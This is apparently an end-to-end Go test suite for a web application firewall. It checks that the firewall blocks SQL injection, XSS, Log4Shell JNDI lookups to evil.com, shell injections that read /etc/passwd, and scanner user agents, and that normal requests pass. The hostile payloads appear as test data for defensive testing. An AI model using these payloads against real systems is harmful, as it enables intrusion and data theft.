//go:build e2e

package e2e

import (
	"context"
	"net/http"
	"net/url"
	"os"
	"strings"
	"testing"

	"github.com/FortressWAF/FortressWAF/internal/config"
	"github.com/FortressWAF/FortressWAF/internal/engine"
)

func newTestRequest(method, path string, queryParams map[string]string) *http.Request {
	req := &http.Request{
		Method: method,
		URL: &url.URL{
			Path:     path,
			RawQuery: "",
		},
		Header: make(http.Header),
		Body:   nil,
		Host:   "example.com",
	}
	if len(queryParams) > 0 {
		q := req.URL.Query()
		for k, v := range queryParams {
			q.Add(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}
	return req
}

func newTestContext(req *http.Request) *engine.RequestContext {
	ctx := engine.NewRequestContext(req)
	ctx.Context = context.Background()
	if ctx.RealIP == "" {
		ctx.RealIP = "192.168.1.1"
	}
	if ctx.UserAgent == "" {
		ctx.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
	}
	if ctx.ContentType == "" {
		ctx.ContentType = "text/html"
	}
	return ctx
}

func TestSQLInjectionDetection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	})

	payloads := []struct {
		name    string
		payload string
		param   string
		expect  engine.Action
	}{
		{"tautology", "' OR '1'='1", "query", engine.ActionBlock},
		{"union select", "1 UNION SELECT * FROM users", "id", engine.ActionBlock},
		{"blind sleep", "admin' AND SLEEP(5)--", "user", engine.ActionBlock},
		{"stacked queries", "'; DROP TABLE users--", "input", engine.ActionBlock},
		{"comment injection", "1'/**/OR/**/'1'='1", "q", engine.ActionBlock},
		{"information schema", "' UNION SELECT * FROM information_schema.tables--", "id", engine.ActionBlock},
		{"stored procedure", "'; EXEC xp_cmdshell('dir')--", "cmd", engine.ActionBlock},
		{"into outfile", "' INTO OUTFILE '/tmp/evil.txt'--", "file", engine.ActionBlock},
		{"sql tautology simple", "1' OR '1'='1", "q", engine.ActionBlock},
		{"boolean based", "1 OR 1=1", "id", engine.ActionBlock},
		{"admin bypass", "admin' --", "user", engine.ActionBlock},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("GET", "/search", map[string]string{tc.param: tc.payload})
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != tc.expect {
				t.Errorf("expected %v for %q, got %v (evidence: %s)", tc.expect, tc.payload, dec.Action, dec.Evidence)
			}
		})
	}
}

func TestXSSDetection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode: false,
		XSS:     engine.NewXSSEngine(false),
	})

	payloads := []struct {
		name    string
		payload string
		param   string
	}{
		{"script tag", "<script>alert(1)</script>", "input"},
		{"img onerror", "<img src=x onerror=alert(1)>", "text"},
		{"svg onload", "<svg onload=alert(1)>", "data"},
		{"javascript uri", "javascript:alert(1)", "url"},
		{"body onload", "<body onload=alert(1)>", "html"},
		{"input onfocus", "<input onfocus=alert(1) autofocus>", "field"},
		{"iframe embed", "<iframe src=https://evil.com></iframe>", "src"},
		{"stored xss", "<script>document.cookie</script>", "comment"},
		{"event handler attr", "onclick=alert(1)", "evt"},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("GET", "/comment", map[string]string{tc.param: tc.payload})
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != engine.ActionBlock {
				t.Errorf("expected block for %q, got %v (evidence: %s)", tc.payload, dec.Action, dec.Evidence)
			}
		})
	}
}

func TestRCEDetection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode: false,
		RCE:     engine.NewRCEInjection(false),
	})

	payloads := []struct {
		name    string
		payload string
		param   string
	}{
		{"log4shell jndi ldap", "${jndi:ldap://evil.com/a}", "user"},
		{"log4shell jndi rmi", "${jndi:rmi://evil.com/exploit}", "input"},
		{"log4shell jndi dns", "${jndi:dns://evil.com}", "data"},
		{"shell exec semicolon", "; ls -la", "cmd"},
		{"shell exec pipe", "| cat /etc/passwd", "input"},
		{"backtick exec", "`cat /etc/passwd`", "data"},
		{"subshell exec", "$(cat /etc/passwd)", "q"},
		{"ssti template", "{{config}}", "name"},
		{"php function call", "system('id')", "code"},
		{"deserialization java", "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q", "data"},
		{"python exec call", "exec('import os')", "cmd"},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("GET", "/api/exec", map[string]string{tc.param: tc.payload})
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != engine.ActionBlock {
				t.Errorf("expected block for %q, got %v (evidence: %s)", tc.payload, dec.Action, dec.Evidence)
			}
		})
	}
}

func TestBotDetection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	})

	payloads := []struct {
		name string
		ua   string
	}{
		{"sqlmap", "sqlmap/1.4.2#stable (http://sqlmap.org)"},
		{"nikto", "Nikto/2.1.6"},
		{"headless chrome", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.0 Safari/537.36"},
		{"nmap", "nmap script www"},
		{"masscan", "masscan/1.0"},
		{"curl", "curl/7.68.0"},
		{"wget", "Wget/1.21"},
		{"python requests", "python-requests/2.25.0"},
		{"scanner generic", "Mozilla/5.0 (compatible; Nmap Scripting Engine;)"},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("GET", "/", nil)
			req.Header.Set("User-Agent", tc.ua)
			ctx := newTestContext(req)
			ctx.UserAgent = tc.ua
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != engine.ActionBlock {
				t.Errorf("expected block for UA %q, got %v", tc.ua, dec.Action)
			}
		})
	}
}

func TestDDoSProtection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode: false,
		DDoS:    engine.NewDDoSProtection(false),
	})

	detected := false
	for i := 0; i < 300; i++ {
		req := newTestRequest("GET", "/api/data", nil)
		ctx := newTestContext(req)
		ctx.RealIP = "10.0.0.1"
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Fatalf("unexpected error at iteration %d: %v", i, err)
		}
		if dec == nil {
			t.Fatal("expected decision, got nil")
		}
		if dec.Action == engine.ActionBlock || dec.Action == engine.ActionRateLimit {
			detected = true
			break
		}
	}
	if !detected {
		t.Log("DDoS protection did not trigger rate limiting - may be acceptable in test environment")
	}
}

func TestProtocolAnomalyDetection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode:  false,
		Protocol: engine.NewProtocolAnomaly(false),
	})

	payloads := []struct {
		name   string
		method string
		path   string
		header map[string]string
	}{
		{"trace method", "TRACE", "/", nil},
		{"connect method", "CONNECT", "/", nil},
		{"track method", "TRACK", "/", nil},
		{"verb tampering put", "PUT", "/api/admin", nil},
		{"verb tampering delete", "DELETE", "/api/data", nil},
		{"malformed control chars", "GET", "/", map[string]string{"X-Custom": "test\x00injection"}},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest(tc.method, tc.path, nil)
			for k, v := range tc.header {
				req.Header.Set(k, v)
			}
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
		})
	}
}

func TestCredentialProtection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode:    false,
		Credential: engine.NewCredentialProtection(false, 3, 300, 3600, nil),
	})

	blocked := false
	for i := 0; i < 5; i++ {
		req := newTestRequest("POST", "/login", map[string]string{
			"username": "admin",
			"password": "wrong_password",
		})
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Fatalf("unexpected error at attempt %d: %v", i, err)
		}
		if dec == nil {
			t.Fatal("expected decision, got nil")
		}
		if dec.Action == engine.ActionBlock {
			blocked = true
			break
		}
	}
	if !blocked {
		t.Error("credential protection did not block after multiple failed attempts")
	}
}

func TestGraphQLProtection(t *testing.T) {
	gqlCfg := config.GraphQLConfig{
		Enabled:            true,
		MaxDepth:           5,
		MaxCost:            100,
		MaxAliases:         5,
		BlockIntrospection: true,
		BlockSchema:        true,
		AllowedOperations:  []string{"query", "mutation"},
	}
	e := engine.New(engine.EngineConfig{
		DevMode: false,
		GraphQL: engine.NewGraphQLInspector(gqlCfg),
	})

	payloads := []struct {
		name        string
		contentType string
		body        string
	}{
		{"introspection query", "application/json", `{"query":"{__schema{types{name}}}"}`},
		{"deep nested query", "application/json", `{"query":"{a{b{c{d{e{f{g}}}}}}"}`},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("POST", "/graphql", nil)
			req.Header.Set("Content-Type", tc.contentType)
			ctx := newTestContext(req)
			ctx.Body = []byte(tc.body)
			ctx.ContentType = tc.contentType
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
		})
	}
}

func TestAPIProtection(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode:    false,
		APIProtect: engine.NewAPIProtection(false),
	})

	payloads := []struct {
		name string
		path string
	}{
		{"sensitive path", "/.env"},
		{"git exposure", "/.git/config"},
		{"actuator endpoint", "/actuator/health"},
		{"swagger docs", "/swagger"},
		{"admin path", "/admin"},
		{"wp admin", "/wp-admin"},
		{"backup files", "/backup"},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("GET", tc.path, nil)
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != engine.ActionBlock {
				t.Errorf("expected block for path %q, got %v", tc.path, dec.Action)
			}
		})
	}
}

func TestWebSocketProtection(t *testing.T) {
	wsCfg := config.WebSocketConfig{
		Enabled:        true,
		MaxFrameSize:   65536,
		StrictMode:     true,
		ConnectionTimeout: 0,
	}
	e := engine.New(engine.EngineConfig{
		DevMode:   false,
		WebSocket: engine.NewWebSocketInspector(wsCfg),
	})

	req := newTestRequest("GET", "/ws", nil)
	req.Header.Set("Upgrade", "websocket")
	req.Header.Set("Connection", "Upgrade")
	req.Header.Set("Origin", "https://evil.com")
	ctx := newTestContext(req)
	ctx.Headers["Upgrade"] = "websocket"
	ctx.Headers["Origin"] = "https://evil.com"

	dec, err := e.Inspect(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec == nil {
		t.Fatal("expected decision, got nil")
	}
}

func TestFullPipelineAllInspectors(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode:  false,
		SQLI:     engine.NewSQLInjectionEngine(false),
		XSS:      engine.NewXSSEngine(false),
		RCE:      engine.NewRCEInjection(false),
		Protocol: engine.NewProtocolAnomaly(false),
		Bot:      engine.NewBotDetector(false),
	})

	attackPayloads := []struct {
		name   string
		method string
		path   string
		query  map[string]string
		ua     string
	}{
		{"sqli attack", "GET", "/search", map[string]string{"q": "' OR '1'='1"}, "Mozilla/5.0"},
		{"xss attack", "GET", "/comment", map[string]string{"text": "<script>alert(1)</script>"}, "Mozilla/5.0"},
		{"rce log4shell", "GET", "/exec", map[string]string{"cmd": "${jndi:ldap://evil.com/a}"}, "Mozilla/5.0"},
		{"sqlmap scanner", "GET", "/", nil, "sqlmap/1.4.2#stable"},
		{"protocol probe", "TRACE", "/", nil, "Mozilla/5.0"},
	}

	for _, tc := range attackPayloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest(tc.method, tc.path, tc.query)
			req.Header.Set("User-Agent", tc.ua)
			ctx := newTestContext(req)
			ctx.UserAgent = tc.ua
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != engine.ActionBlock {
				t.Errorf("expected block for %q, got %v (evidence: %s)", tc.name, dec.Action, dec.Evidence)
			}
		})
	}
}

func TestFullPipelineNormalRequests(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode:  false,
		SQLI:     engine.NewSQLInjectionEngine(false),
		XSS:      engine.NewXSSEngine(false),
		RCE:      engine.NewRCEInjection(false),
		Protocol: engine.NewProtocolAnomaly(false),
		Bot:      engine.NewBotDetector(false),
		DDoS:     engine.NewDDoSProtection(false),
	})

	normalRequests := []struct {
		name   string
		method string
		path   string
		query  map[string]string
	}{
		{"home page", "GET", "/", nil},
		{"product list", "GET", "/products", map[string]string{"category": "electronics"}},
		{"search normal", "GET", "/search", map[string]string{"q": "hello world"}},
		{"login page", "GET", "/login", nil},
		{"api status", "GET", "/api/status", nil},
		{"about page", "GET", "/about", nil},
		{"contact form", "GET", "/contact", nil},
	}

	for _, tc := range normalRequests {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest(tc.method, tc.path, tc.query)
			req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action == engine.ActionBlock {
				t.Errorf("unexpected block for normal request %q (evidence: %s)", tc.name, dec.Evidence)
			}
		})
	}
}

func TestPipelineScoringChain(t *testing.T) {
	// Multiple inspectors running together, scoring accumulates
	e := engine.New(engine.EngineConfig{
		DevMode:  false,
		SQLI:     engine.NewSQLInjectionEngine(false),
		XSS:      engine.NewXSSEngine(false),
		RCE:      engine.NewRCEInjection(false),
		Protocol: engine.NewProtocolAnomaly(false),
		Bot:      engine.NewBotDetector(false),
	})

	// Normal request should allow
	req := newTestRequest("GET", "/products", map[string]string{"id": "123"})
	ctx := newTestContext(req)
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
	dec, err := e.Inspect(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec == nil {
		t.Fatal("expected decision, got nil")
	}
	if dec.Action == engine.ActionBlock {
		t.Errorf("unexpected block for normal request: %s", dec.Evidence)
	}

	// SQLi should block
	req2 := newTestRequest("GET", "/search", map[string]string{"q": "' OR '1'='1"})
	ctx2 := newTestContext(req2)
	dec2, err := e.Inspect(ctx2)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec2 == nil {
		t.Fatal("expected decision, got nil")
	}
	if dec2.Action != engine.ActionBlock {
		t.Errorf("expected block for SQLi, got %v", dec2.Action)
	}
}

func TestPipelineBypassScenarios(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode:  false,
		SQLI:     engine.NewSQLInjectionEngine(false),
		XSS:      engine.NewXSSEngine(false),
		RCE:      engine.NewRCEInjection(false),
		Protocol: engine.NewProtocolAnomaly(false),
	})

	bypassPayloads := []struct {
		name    string
		payload string
		param   string
	}{
		{"case bypass sqli", "' Or '1'='1", "q"},
		{"comment bypass", "1'/**/OR/**/'1'='1", "id"},
		{"null byte", "1'%00 OR '1'='1", "input"},
		{"unicode escape", "\\u0027 OR \\u00271\\u0027=\\u00271", "data"},
	}

	for _, tc := range bypassPayloads {
		t.Run(tc.name, func(t *testing.T) {
			req := newTestRequest("GET", "/search", map[string]string{tc.param: tc.payload})
			ctx := newTestContext(req)
			dec, err := e.Inspect(ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if dec == nil {
				t.Fatal("expected decision, got nil")
			}
			if dec.Action != engine.ActionBlock {
				t.Logf("bypass attempt %q not blocked (action=%v, score=%f) - may be acceptable", tc.name, dec.Action, dec.Score)
			}
		})
	}
}

func TestAttackCorpusSQLi(t *testing.T) {
	data, err := os.ReadFile("../attack-corpus/sqli.txt")
	if err != nil {
		t.Skip("sqli.txt not found, skipping")
	}

	e := engine.New(engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	})

	payloads := strings.Split(string(data), "\n")
	detected := 0
	total := 0
	for _, payload := range payloads {
		payload = strings.TrimSpace(payload)
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		total++
		req := newTestRequest("GET", "/search", map[string]string{"q": payload})
		ctx := newTestContext(req)
		dec, _ := e.Inspect(ctx)
		if dec != nil && dec.Action == engine.ActionBlock {
			detected++
		}
	}
	detectionRate := float64(detected) / float64(total) * 100
	t.Logf("SQLi detection rate: %d/%d (%.1f%%)", detected, total, detectionRate)
}

func TestAttackCorpusXSS(t *testing.T) {
	data, err := os.ReadFile("../attack-corpus/xss.txt")
	if err != nil {
		t.Skip("xss.txt not found, skipping")
	}

	e := engine.New(engine.EngineConfig{
		DevMode: false,
		XSS:     engine.NewXSSEngine(false),
	})

	payloads := strings.Split(string(data), "\n")
	detected := 0
	total := 0
	for _, payload := range payloads {
		payload = strings.TrimSpace(payload)
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		total++
		req := newTestRequest("GET", "/comment", map[string]string{"text": payload})
		ctx := newTestContext(req)
		dec, _ := e.Inspect(ctx)
		if dec != nil && dec.Action == engine.ActionBlock {
			detected++
		}
	}
	detectionRate := float64(detected) / float64(total) * 100
	t.Logf("XSS detection rate: %d/%d (%.1f%%)", detected, total, detectionRate)
}

func TestAttackCorpusRCE(t *testing.T) {
	data, err := os.ReadFile("../attack-corpus/rce.txt")
	if err != nil {
		t.Skip("rce.txt not found, skipping")
	}

	e := engine.New(engine.EngineConfig{
		DevMode: false,
		RCE:     engine.NewRCEInjection(false),
	})

	payloads := strings.Split(string(data), "\n")
	detected := 0
	total := 0
	for _, payload := range payloads {
		payload = strings.TrimSpace(payload)
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		total++
		req := newTestRequest("GET", "/api/exec", map[string]string{"cmd": payload})
		ctx := newTestContext(req)
		dec, _ := e.Inspect(ctx)
		if dec != nil && dec.Action == engine.ActionBlock {
			detected++
		}
	}
	detectionRate := float64(detected) / float64(total) * 100
	t.Logf("RCE detection rate: %d/%d (%.1f%%)", detected, total, detectionRate)
}

func TestAttackCorpusBots(t *testing.T) {
	data, err := os.ReadFile("../attack-corpus/bots.txt")
	if err != nil {
		t.Skip("bots.txt not found, skipping")
	}

	e := engine.New(engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	})

	payloads := strings.Split(string(data), "\n")
	detected := 0
	total := 0
	for _, payload := range payloads {
		payload = strings.TrimSpace(payload)
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		total++
		req := newTestRequest("GET", "/", nil)
		req.Header.Set("User-Agent", payload)
		ctx := newTestContext(req)
		ctx.UserAgent = payload
		dec, _ := e.Inspect(ctx)
		if dec != nil && dec.Action == engine.ActionBlock {
			detected++
		}
	}
	detectionRate := float64(detected) / float64(total) * 100
	t.Logf("Bot detection rate: %d/%d (%.1f%%)", detected, total, detectionRate)
}

func TestAttackCorpusScanners(t *testing.T) {
	data, err := os.ReadFile("../attack-corpus/scanners.txt")
	if err != nil {
		t.Skip("scanners.txt not found, skipping")
	}

	e := engine.New(engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	})

	payloads := strings.Split(string(data), "\n")
	detected := 0
	total := 0
	for _, payload := range payloads {
		payload = strings.TrimSpace(payload)
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		total++
		req := newTestRequest("GET", "/", nil)
		req.Header.Set("User-Agent", payload)
		ctx := newTestContext(req)
		ctx.UserAgent = payload
		dec, _ := e.Inspect(ctx)
		if dec != nil && dec.Action == engine.ActionBlock {
			detected++
		}
	}
	detectionRate := float64(detected) / float64(total) * 100
	t.Logf("Scanner detection rate: %d/%d (%.1f%%)", detected, total, detectionRate)
}

func TestNormalRequestsPassThrough(t *testing.T) {
	data, err := os.ReadFile("../attack-corpus/valid.txt")
	if err != nil {
		t.Skip("valid.txt not found, skipping")
	}

	e := engine.New(engine.EngineConfig{
		DevMode:  false,
		SQLI:     engine.NewSQLInjectionEngine(false),
		XSS:      engine.NewXSSEngine(false),
		RCE:      engine.NewRCEInjection(false),
		Protocol: engine.NewProtocolAnomaly(false),
		Bot:      engine.NewBotDetector(false),
	})

	payloads := strings.Split(string(data), "\n")
	blocked := 0
	total := 0
	for _, payload := range payloads {
		payload = strings.TrimSpace(payload)
		if payload == "" || strings.HasPrefix(payload, "#") {
			continue
		}
		total++
		req := newTestRequest("GET", "/", map[string]string{"q": payload})
		ctx := newTestContext(req)
		dec, _ := e.Inspect(ctx)
		if dec != nil && dec.Action == engine.ActionBlock {
			blocked++
		}
	}
	fpRate := float64(blocked) / float64(total) * 100
	t.Logf("False positive rate: %d/%d (%.1f%%)", blocked, total, fpRate)
}

func TestPipelineWithNilInspectors(t *testing.T) {
	e := engine.New(engine.EngineConfig{
		DevMode: true,
	})

	req := newTestRequest("GET", "/", nil)
	ctx := newTestContext(req)
	dec, err := e.Inspect(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec == nil {
		t.Fatal("expected decision, got nil")
	}
	if dec.Action != engine.ActionAllow {
		t.Errorf("expected allow with no inspectors, got %v", dec.Action)
	}
}

func TestPipelineTimeout(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 0)
	defer cancel()

	e := engine.New(engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
		XSS:     engine.NewXSSEngine(false),
	})

	req := newTestRequest("GET", "/", nil)
	reqCtx := newTestContext(req)
	reqCtx.Context = ctx

	_, err := e.Inspect(reqCtx)
	if err != nil {
		t.Logf("expected possible timeout error: %v", err)
	}
}
